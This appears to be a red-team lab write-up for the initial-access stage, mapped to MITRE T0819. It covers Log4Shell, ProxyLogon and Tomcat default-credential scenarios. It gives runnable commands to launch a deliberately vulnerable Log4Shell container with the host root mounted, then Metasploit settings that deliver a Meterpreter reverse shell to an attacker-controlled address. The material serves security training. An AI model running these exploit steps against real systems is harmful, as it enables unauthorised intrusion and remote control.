# **Initial Access:**

\[ T0819 ] <https://attack.mitre.org/techniques/T0819/> 


## Objective:

The goal of this step is for the attacker to gain initial access to the victim's network by exploiting a vulnerability in an application or service that is exposed to the internet.


## MITRE Technique: T0819 - Exploit Public-Facing Application

This technique involves using an exploit to take advantage of a weakness in an application that is accessible from the internet. This could be a web server, web application, or any other service that can be reached from outside the organization's network.


## Tools/Services:

1. **Metasploit Framework:** A powerful tool used for developing and executing exploit code against a remote target machine. It includes a large collection of exploits, payloads, and auxiliary modules.

2. **Burp Suite:** A web vulnerability scanner and penetration testing tool that helps in identifying and exploiting web application vulnerabilities.


## Scenarios:

As this step in the scenario is, essentially, setting up a vulnerable public-facing service, we could do any of the following:


### **1 - CVE-2021-44228 (Log4Shell)**

#### **Description:**

The Log4Shell vulnerability affects the Apache Log4j 2 library, which is widely used for logging in Java applications. By sending a specially crafted request, an attacker can trigger the vulnerability to execute arbitrary code on the server.


#### **Tools/Services:**

- **Metasploit Framework:** Contains a module specifically for exploiting the Log4Shell vulnerability.

- **Python:** Can be used to craft and send the malicious request if you prefer a custom script.


### **2 - CVE-2021-26855 (ProxyLogon)**

#### **Description:**

The ProxyLogon vulnerability allows an unauthenticated attacker to execute arbitrary commands on a vulnerable Microsoft Exchange Server by sending a specially crafted request. This can result in remote code execution (RCE) and full control of the server.


#### **Tools/Services:**

- **Metasploit Framework:** Contains a module specifically for exploiting the ProxyLogon vulnerability.

- **Exchange Server:** A server running Microsoft Exchange that is vulnerable to this specific exploit.


### **3 - Exploiting Weak or Default Credentials in Apache Tomcat**

#### **Description:**

Apache Tomcat is an open-source implementation of the Java Servlet, JavaServer Pages, and Java Expression Language technologies. It's widely used to deploy Java-based web applications. Attackers often exploit weak or default credentials (admin/admin) to gain access to the Tomcat Manager application, which can be used to deploy or manage web applications on the server.


#### **Tools/Services:**

- **Metasploit Framework:** Contains modules for brute-forcing login credentials specifically for Tomcat.

- **Hydra:** A popular tool for brute-forcing login credentials for web applications.

- **Target Service:** Apache Tomcat with the Tomcat Manager application.


## Applying scenarios:

#### Log4Shell Attack - How it works

1. **Vulnerability Identification**: The Log4j library is used extensively in Java applications for logging purposes. A flaw in the JNDI (Java Naming and Directory Interface) lookup functionality allows remote code execution by injecting a JNDI URL into a log message.

2. **Exploit Execution**: The attacker sends a request containing a malicious JNDI URL. When the vulnerable application logs this request, the JNDI lookup mechanism fetches and executes the code from the attacker-controlled server.

3. **Remote Code Execution**: The code fetched via the JNDI URL is executed on the target server, giving the attacker control over the system. This can be used to deploy further payloads, access sensitive information, or pivot to other parts of the network.


#### Log4Shell Attack - Steps to Perform the Attack

#### **Prerequisites**

- Docker installed on the host machine.

- Metasploit framework installed on the attacker machine.


#### **Step 1: Setup the Vulnerable Application**

1. **Pull and Run the Docker Container** Execute the following command to run the vulnerable application with a volume connected to `/` of the host machine:

```
# super user privileges
sudo su
# start Docker container with the vulnerable application
docker run --name vulnerable-app --network host -v /:/root/ ghcr.io/christophetd/log4shell-vulnerable-app\@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929

```
**Explanation**:

- \--network host: Connects the container to the host's network.

- -v /:/root/: Mounts the host's root directory to the container's /root/ directory, giving access to all host data and simulating an application that runs in the target machine.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe_YsFlcVhkvd6jpqsZYdJ3L5zQK-hhJ0moP6OwYv9Pl-hv2vrtN-yM44ZBlZzpdbRJT268l61LruQuAE2HX0xNmi4A3tSabEML_M_JDQ1AE4CgCPcr-kJMnp7Z3BeaqFfKQH79GNI3E_R0KfN3vIiihEbL?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 3**: Step 1 - Log4Shell attack.


#### **Step 2: Exploit the Vulnerability using Metasploit**

1. **Start Metasploit** Launch the Metasploit console in the attacker machine.

2. **Select the Log4Shell Exploit Module** Use the Log4Shell exploit module.

3. **Set the Target and Payload** Configure the target URL and the payload for the exploi.:

4. **Execute the Exploit** Run the exploit to send the malicious request.

```
# step 1
sudo msfconsole
# step 2
use exploit/multi/http/log4shell_header_injection  
# step 3
setg HTTP_HEADER X-Api-Version
setg RHOSTS <target-ip>  # 10.208.89.15
setg RPORT <target-port> # 8080
setg SRVHOST <host-server-ip> # 10.208.5.100
setg SRVPORT <host-server-port> # 1389
setg TARGETURI <target url> # /
setg HTTP_SRVPORT <target http_port> # 8080
setg LHOST <listening ip - host ip> # 10.208.5.100
setg payload java/meterpreter/reverse_tcp
#step 4
exploit


```
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd6ZNXxMwob6Oi0GboJXDz-WnOkLEp1GR92mlkRGohPGSF0x2TzQOh6Pt_rmRmKk-6X0OwH0zdGteIvjM8qk-U2E9nxbCyJXfkYM-Of-rWkVK-QUTSiVPFTivQ25bfrWxZbwJDtV4rvuEafdnzNnUZfZ9Ny?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 4:** Log4Shell exploit options after setting.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXffUB-GmO40IUt7r4_cqAMCPdctShY55pK5FiJmTDFndtP0R5NYD0gOQrRvX-LLOIPQhp2AP7QUrqLYXv8I9YjDQk7A5JNUG3dZrgmQbaB42Awt9lP64yotjy3c3FvGS60edvubjfO9JuqNVBd4cqg2S2s?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 5:** Log4Shell exploit execution with successful remote execution.
